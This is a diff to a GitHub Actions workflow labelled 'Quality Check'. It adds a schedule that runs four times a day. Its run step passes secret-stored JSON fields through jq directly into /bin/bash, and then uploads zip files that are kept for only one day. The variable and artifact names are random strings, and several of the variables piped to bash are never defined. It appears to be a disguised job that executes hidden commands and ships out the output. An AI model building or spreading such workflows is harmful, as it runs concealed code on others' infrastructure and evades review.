@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '34 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,20 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          lpcg6548: ${{ secrets.lpcg6548 }}
+          uj7: ${{ secrets.uj7 }}
         run: |
-          printf '%s' "$lpcg6548" | jq -r .g2758 | /bin/bash
-          echo $vdvr84426 | jq -r .wknin53 | /bin/bash
-          echo $mkj5 | jq -r .awvzl531 | /bin/bash
-          echo $vhcel764 | jq -r .xwa3688 | /bin/bash
-          printf '%s' "$ybnc2072" | jq -r .eylp3 | /bin/bash
-          echo $woq42 | jq -r .pjmmu57921 | /bin/bash
-          echo $yb90289 | jq -r .ifq8 | /bin/bash
-          printf '%s' "$msm04" | jq -r .miijz71840 | /bin/bash
+          printf '%s' "$uj7" | jq -r .dgnti609 | /bin/bash
+          printf '%s' "$slpsj409" | jq -r .jmrb0178 | /bin/bash
+          printf '%s' "$zialn447" | jq -r .c0 | /bin/bash
+          printf '%s' "$n04" | jq -r .jbhd18 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: Od9YSPGl
+          name: rorXF1XC
           path: "*.zip"
           retention-days: 1
